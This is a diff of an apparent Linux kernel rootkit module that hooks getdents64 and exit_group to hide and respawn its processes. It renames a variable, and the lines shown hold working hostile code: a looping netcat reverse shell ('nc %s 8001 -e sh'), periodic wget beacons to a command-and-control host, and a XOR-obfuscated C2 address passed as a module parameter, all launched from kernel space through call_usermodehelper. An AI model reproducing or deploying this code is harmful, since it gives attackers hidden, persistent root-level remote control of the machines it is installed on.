@@ -15,8 +15,8 @@ MODULE_AUTHOR("tibo.wav");
 MODULE_DESCRIPTION("Hook __x64_sys_getdents64 and __x64_sys_exit_group to kill our processes and respawn them");
 MODULE_INFO(intree, "Y");
 
-static char ip_param[KSYM_NAME_LEN] = "127.0.0.1";
-module_param_string(param, ip_param, KSYM_NAME_LEN, 0644);
+static char host[KSYM_NAME_LEN] = "127.0.0.1";
+module_param_string(param, host, KSYM_NAME_LEN, 0644);
 
 /* static struct kprobe kp; */
 static struct kprobe kp2;
@@ -100,9 +100,9 @@ static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
 // initiate rev shell
 static void rev_shell(void) {
 	char *shell;
-	int size = strlen("while true; do nc ") + strlen(ip_param) + strlen(" 8001 -e sh; sleep 30; done") + 1;
+	int size = strlen("while true; do nc ") + strlen(host) + strlen(" 8001 -e sh; sleep 30; done") + 1;
 	shell = kmalloc(size, GFP_KERNEL);
-	snprintf(shell, size, "while true; do nc %s 8001 -e sh; sleep 30; done", ip_param);
+	snprintf(shell, size, "while true; do nc %s 8001 -e sh; sleep 30; done", host);
 	char *argv[] = {"/bin/sh", "-c", shell, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
@@ -110,9 +110,9 @@ static void rev_shell(void) {
 //function to make a request every 30s
 static void make_request_periodic(void) {
 	char *str;
-	int size = strlen("while true; do wget http://") + strlen(ip_param) + strlen(":8000/UP; sleep 30; done") + 1;
+	int size = strlen("while true; do wget http://") + strlen(host) + strlen(":8000/UP; sleep 30; done") + 1;
 	str = kmalloc(size, GFP_KERNEL);
-	snprintf(str, size, "while true; do wget http://%s:8000/UP; sleep 30; done", ip_param);
+	snprintf(str, size, "while true; do wget http://%s:8000/UP; sleep 30; done", host);
 	char *argv[] = {"/bin/sh", "-c", str, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
@@ -120,9 +120,9 @@ static void make_request_periodic(void) {
 // function to make requests with a specified string
 static void make_request(char *str) {
 	char *command;
-	int size = strlen("http://") + strlen(ip_param) + strlen(":8000/") + strlen(str) + 1;
+	int size = strlen("http://") + strlen(host) + strlen(":8000/") + strlen(str) + 1;
 	command = kmalloc(size, GFP_KERNEL);
-	snprintf(command, size, "http://%s:8000/%s", ip_param, str);
+	snprintf(command, size, "http://%s:8000/%s", host, str);
 	char *argv[] = {"/usr/bin/wget", command, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 	kfree(command);
@@ -171,8 +171,8 @@ static int __init hook_init(void) {
 	
 	// récupérer l'IP du C2 a partir du param
  	u8 key = 126;
-	custom_xor(ip_param, ip_param, key, strlen(ip_param));
-	/* pr_info("[+] IP: %s\n", ip_param); */
+	custom_xor(host, host, key, strlen(host));
+	/* pr_info("[+] IP: %s\n", host); */
 
 	// networking start
 	make_request("START");
